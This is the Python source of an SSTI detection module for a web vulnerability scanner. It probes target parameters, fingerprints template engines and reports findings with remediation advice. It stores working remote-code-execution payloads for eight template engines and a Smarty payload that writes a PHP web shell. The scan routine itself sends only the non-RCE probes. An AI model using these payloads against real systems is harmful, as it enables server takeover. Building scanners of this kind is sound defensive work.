"""
VulnHawk SSTI Detection Module

Detects Server-Side Template Injection vulnerabilities with:
- Multi-engine detection (Jinja2, Twig, FreeMarker, etc.)
- Blind SSTI detection
- Framework fingerprinting
- RCE payload validation

Author: VulnHawk Team
"""

import re
import asyncio
import random
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from dataclasses import dataclass
from enum import Enum

from app.scanner.modules.base import BaseModule, VulnerabilityResult


class TemplateEngine(Enum):
    """Supported template engines."""
    UNKNOWN = "unknown"
    JINJA2 = "jinja2"
    TWIG = "twig"
    FREEMARKER = "freemarker"
    VELOCITY = "velocity"
    SMARTY = "smarty"
    MAKO = "mako"
    ERB = "erb"
    PEBBLE = "pebble"
    THYMELEAF = "thymeleaf"
    HANDLEBARS = "handlebars"


@dataclass
class SSTIPayload:
    """SSTI test payload."""
    payload: str
    engine: TemplateEngine
    description: str
    expected_output: str
    is_rce: bool = False
    severity_boost: float = 0.0


class SSTIModule(BaseModule):
    """
    Advanced SSTI Detection Module.

    Detects template injection vulnerabilities across multiple
    template engines with framework fingerprinting.
    """

    def __init__(self):
        super().__init__()
        self.name = "SSTI Scanner"
        self.description = "Detects Server-Side Template Injection vulnerabilities"

        # Generate random numbers for detection
        self.a = random.randint(10, 99)
        self.b = random.randint(10, 99)
        self.expected_result = str(self.a * self.b)

        # Universal detection payloads
        self.detection_payloads = [
            # Math-based detection (works across many engines)
            SSTIPayload(f'{{{{{self.a}*{self.b}}}}}', TemplateEngine.UNKNOWN, 'Jinja2/Twig math', self.expected_result),
            SSTIPayload(f'${{{self.a}*{self.b}}}', TemplateEngine.UNKNOWN, 'FreeMarker/Velocity math', self.expected_result),
            SSTIPayload(f'<%= {self.a}*{self.b} %>', TemplateEngine.ERB, 'ERB math', self.expected_result),
            SSTIPayload(f'#{{{self.a}*{self.b}}}', TemplateEngine.UNKNOWN, 'Ruby/Java interpolation', self.expected_result),
            SSTIPayload(f'*{{{self.a}*{self.b}}}', TemplateEngine.THYMELEAF, 'Thymeleaf math', self.expected_result),
            SSTIPayload(f'@({self.a}*{self.b})', TemplateEngine.UNKNOWN, 'Razor math', self.expected_result),
            SSTIPayload(f'{{{self.a}*{self.b}}}', TemplateEngine.HANDLEBARS, 'Simple braces', self.expected_result),

            # String-based detection
            SSTIPayload("{{7*'7'}}", TemplateEngine.JINJA2, 'Jinja2 string multiplication', '7777777'),
            SSTIPayload("{{'7'*7}}", TemplateEngine.JINJA2, 'Jinja2 string mult alt', '7777777'),
            SSTIPayload("${7*7}", TemplateEngine.FREEMARKER, 'FreeMarker basic', '49'),
            SSTIPayload("#{7*7}", TemplateEngine.VELOCITY, 'Velocity basic', '49'),
        ]

        # Engine-specific fingerprinting payloads
        self.fingerprint_payloads = {
            TemplateEngine.JINJA2: [
                SSTIPayload("{{config}}", TemplateEngine.JINJA2, 'Jinja2 config access', 'Config'),
                SSTIPayload("{{request}}", TemplateEngine.JINJA2, 'Jinja2 request object', 'Request'),
                SSTIPayload("{{self}}", TemplateEngine.JINJA2, 'Jinja2 self reference', 'TemplateReference'),
            ],
            TemplateEngine.TWIG: [
                SSTIPayload("{{_self}}", TemplateEngine.TWIG, 'Twig self reference', 'Template'),
                SSTIPayload("{{app}}", TemplateEngine.TWIG, 'Twig app object', 'App'),
            ],
            TemplateEngine.FREEMARKER: [
                SSTIPayload("${.version}", TemplateEngine.FREEMARKER, 'FreeMarker version', '.'),
                SSTIPayload("${.now}", TemplateEngine.FREEMARKER, 'FreeMarker now', ':'),
            ],
            TemplateEngine.SMARTY: [
                SSTIPayload("{$smarty.version}", TemplateEngine.SMARTY, 'Smarty version', '.'),
            ],
        }

        # Exploitation payloads (for confirmation and severity assessment)
        self.exploitation_payloads = {
            TemplateEngine.JINJA2: [
                SSTIPayload(
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    TemplateEngine.JINJA2,
                    'Jinja2 subclass enumeration',
                    'class',
                    is_rce=False,
                    severity_boost=1.0
                ),
                SSTIPayload(
                    "{{config.items()}}",
                    TemplateEngine.JINJA2,
                    'Jinja2 config leak',
                    'SECRET',
                    is_rce=False,
                    severity_boost=1.5
                ),
                SSTIPayload(
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                    TemplateEngine.JINJA2,
                    'Jinja2 RCE via request',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
                SSTIPayload(
                    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                    TemplateEngine.JINJA2,
                    'Jinja2 RCE via cycler',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.TWIG: [
                SSTIPayload(
                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                    TemplateEngine.TWIG,
                    'Twig RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
                SSTIPayload(
                    "{{['id']|filter('system')}}",
                    TemplateEngine.TWIG,
                    'Twig RCE via filter',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.FREEMARKER: [
                SSTIPayload(
                    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                    TemplateEngine.FREEMARKER,
                    'FreeMarker RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
                SSTIPayload(
                    "${'freemarker.template.utility.Execute'?new()('id')}",
                    TemplateEngine.FREEMARKER,
                    'FreeMarker RCE alt',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.VELOCITY: [
                SSTIPayload(
                    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
                    TemplateEngine.VELOCITY,
                    'Velocity RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.SMARTY: [
                SSTIPayload(
                    "{system('id')}",
                    TemplateEngine.SMARTY,
                    'Smarty RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
                SSTIPayload(
                    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearConfig())}",
                    TemplateEngine.SMARTY,
                    'Smarty file write',
                    '',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.ERB: [
                SSTIPayload(
                    "<%= system('id') %>",
                    TemplateEngine.ERB,
                    'ERB RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
                SSTIPayload(
                    "<%= `id` %>",
                    TemplateEngine.ERB,
                    'ERB backtick RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.MAKO: [
                SSTIPayload(
                    "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
                    TemplateEngine.MAKO,
                    'Mako RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
            TemplateEngine.PEBBLE: [
                SSTIPayload(
                    "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}",
                    TemplateEngine.PEBBLE,
                    'Pebble RCE',
                    'uid=',
                    is_rce=True,
                    severity_boost=3.0
                ),
            ],
        }

        # Parameters commonly vulnerable to SSTI
        self.ssti_parameters = [
            'template', 'tpl', 'page', 'content', 'text', 'message',
            'msg', 'name', 'title', 'description', 'body', 'html',
            'render', 'view', 'layout', 'theme', 'format', 'preview',
            'input', 'data', 'value', 'query', 'search', 'q'
        ]

    def _inject_payload(self, url: str, param: str, payload: str,
                        form_data: Optional[Dict] = None) -> Tuple[str, Optional[Dict]]:
        """Inject SSTI payload into URL or form data."""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        new_form_data = form_data.copy() if form_data else None

        # Try to inject into query params first
        if param in query_params:
            query_params[param] = [payload]
        elif new_form_data and param in new_form_data:
            new_form_data[param] = payload
        else:
            # Add as new query param
            query_params[param] = [payload]

        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

        return new_url, new_form_data

    def _check_response(self, response_text: str, payload: SSTIPayload) -> Tuple[bool, str]:
        """Check if response indicates SSTI."""
        # Check for expected output
        if payload.expected_output and payload.expected_output in response_text:
            return True, f"Expected output '{payload.expected_output}' found"

        # Check for error messages that indicate template processing
        error_indicators = [
            'TemplateSyntaxError',
            'TemplateError',
            'UndefinedError',
            'jinja2',
            'twig',
            'freemarker',
            'velocity',
            'smarty',
            'mako',
            'ERB',
            'template',
            'parse error',
            'compilation error',
        ]

        response_lower = response_text.lower()
        for indicator in error_indicators:
            if indicator.lower() in response_lower:
                return True, f"Template error indicator '{indicator}' found"

        return False, ""

    def _identify_engine(self, response_text: str, successful_payloads: List[SSTIPayload]) -> TemplateEngine:
        """Identify the template engine based on responses."""
        response_lower = response_text.lower()

        # Check by engine-specific indicators
        engine_indicators = {
            TemplateEngine.JINJA2: ['jinja2', 'werkzeug', 'flask', 'templatereference'],
            TemplateEngine.TWIG: ['twig', 'symfony'],
            TemplateEngine.FREEMARKER: ['freemarker'],
            TemplateEngine.VELOCITY: ['velocity'],
            TemplateEngine.SMARTY: ['smarty'],
            TemplateEngine.ERB: ['erb', 'ruby', 'rails'],
            TemplateEngine.MAKO: ['mako'],
            TemplateEngine.THYMELEAF: ['thymeleaf', 'spring'],
        }

        for engine, indicators in engine_indicators.items():
            if any(ind in response_lower for ind in indicators):
                return engine

        # Check by successful payload type
        for payload in successful_payloads:
            if payload.engine != TemplateEngine.UNKNOWN:
                return payload.engine

        return TemplateEngine.UNKNOWN

    def _determine_severity(self, engine: TemplateEngine, rce_confirmed: bool,
                            config_leaked: bool) -> str:
        """Determine vulnerability severity."""
        if rce_confirmed:
            return "critical"
        elif config_leaked:
            return "high"
        elif engine != TemplateEngine.UNKNOWN:
            return "high"  # Known engine usually means exploitable
        else:
            return "medium"

    async def test_ssti(self, session, url: str, method: str, param: str,
                        payload: SSTIPayload, form_data: Optional[Dict] = None
                        ) -> Tuple[bool, str, Optional[str]]:
        """Test a single SSTI payload."""
        try:
            test_url, test_form_data = self._inject_payload(url, param, payload.payload, form_data)

            if method.upper() == "POST" and test_form_data:
                async with session.post(test_url, data=test_form_data, timeout=10) as response:
                    response_text = await response.text()
            else:
                async with session.get(test_url, timeout=10) as response:
                    response_text = await response.text()

            detected, evidence = self._check_response(response_text, payload)
            return detected, response_text, evidence if detected else None

        except Exception as e:
            self.logger.debug(f"SSTI test error: {e}")
            return False, "", None

    async def scan(self, session, url: str, method: str = "GET",
                   form_data: Optional[Dict] = None) -> List[VulnerabilityResult]:
        """
        Scan for SSTI vulnerabilities.

        Args:
            session: aiohttp session
            url: Target URL
            method: HTTP method
            form_data: Optional form data

        Returns:
            List of discovered vulnerabilities
        """
        results = []

        # Find potential parameters
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        params_to_test = list(query_params.keys())

        if form_data:
            params_to_test.extend(form_data.keys())

        # Add common SSTI parameters if none found
        if not params_to_test:
            params_to_test = self.ssti_parameters[:5]

        # Filter to likely vulnerable parameters
        priority_params = [p for p in params_to_test if p.lower() in self.ssti_parameters]
        other_params = [p for p in params_to_test if p not in priority_params]
        params_to_test = priority_params + other_params[:3]

        for param in params_to_test:
            successful_payloads = []
            rce_confirmed = False
            config_leaked = False
            full_response = ""

            # Phase 1: Detection
            for payload in self.detection_payloads:
                detected, response_text, evidence = await self.test_ssti(
                    session, url, method, param, payload, form_data
                )
                if detected:
                    successful_payloads.append(payload)
                    full_response = response_text
                    break  # Found vulnerability, proceed to fingerprinting

            if not successful_payloads:
                continue

            # Phase 2: Engine fingerprinting
            detected_engine = self._identify_engine(full_response, successful_payloads)

            if detected_engine != TemplateEngine.UNKNOWN:
                # Test engine-specific fingerprint payloads
                fingerprint_payloads = self.fingerprint_payloads.get(detected_engine, [])
                for payload in fingerprint_payloads:
                    detected, response_text, _ = await self.test_ssti(
                        session, url, method, param, payload, form_data
                    )
                    if detected:
                        successful_payloads.append(payload)
                        if 'config' in payload.description.lower() or 'secret' in response_text.lower():
                            config_leaked = True

            # Phase 3: Exploitation verification (careful - only for confirmation)
            if detected_engine != TemplateEngine.UNKNOWN:
                exploit_payloads = self.exploitation_payloads.get(detected_engine, [])
                # Only test info-disclosure payloads, not RCE
                safe_exploits = [p for p in exploit_payloads if not p.is_rce]
                for payload in safe_exploits[:2]:
                    detected, response_text, _ = await self.test_ssti(
                        session, url, method, param, payload, form_data
                    )
                    if detected:
                        successful_payloads.append(payload)
                        if any(term in response_text.lower() for term in ['secret', 'password', 'key', 'token']):
                            config_leaked = True

            # Create vulnerability result
            severity = self._determine_severity(detected_engine, rce_confirmed, config_leaked)

            result = VulnerabilityResult(
                name=f"Server-Side Template Injection ({detected_engine.value})",
                description=f"SSTI vulnerability detected in parameter '{param}'. "
                            f"Template engine identified: {detected_engine.value}. "
                            f"{'RCE is likely possible.' if detected_engine != TemplateEngine.UNKNOWN else 'Further analysis needed.'} "
                            f"This vulnerability allows attackers to inject template directives that are executed server-side, "
                            f"potentially leading to remote code execution.",
                severity=severity,
                url=url,
                parameter=param,
                method=method,
                payload=successful_payloads[0].payload if successful_payloads else "N/A",
                evidence=f"Detection payload triggered template processing. Engine: {detected_engine.value}",
                remediation="Never pass user input directly to template engines. "
                            "Use sandboxed template environments where available. "
                            "Implement strict input validation and use allowlisting for template variables. "
                            f"For {detected_engine.value}, ensure user input is properly escaped.",
                cvss_score=9.8 if severity == "critical" else 8.8 if severity == "high" else 6.5,
                cwe_id="CWE-1336",
                confidence="HIGH" if detected_engine != TemplateEngine.UNKNOWN else "MEDIUM"
            )

            results.append(result)

        return results

    async def quick_scan(self, session, url: str,
                         form_data: Optional[Dict] = None) -> List[VulnerabilityResult]:
        """Quick SSTI scan with essential payloads only."""
        results = []

        # Use only universal detection payloads
        quick_payloads = self.detection_payloads[:4]

        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        params = list(query_params.keys())[:2]

        if not params:
            params = ['template', 'content']

        for param in params:
            for payload in quick_payloads:
                detected, response_text, evidence = await self.test_ssti(
                    session, url, "GET", param, payload, form_data
                )
                if detected:
                    results.append(VulnerabilityResult(
                        name="Server-Side Template Injection",
                        description=f"SSTI vulnerability detected in parameter '{param}'.",
                        severity="high",
                        url=url,
                        parameter=param,
                        payload=payload.payload,
                        evidence=evidence or "Template processing detected",
                        remediation="Never pass user input directly to template engines.",
                        cvss_score=8.8,
                        cwe_id="CWE-1336",
                        confidence="MEDIUM"
                    ))
                    break

        return results
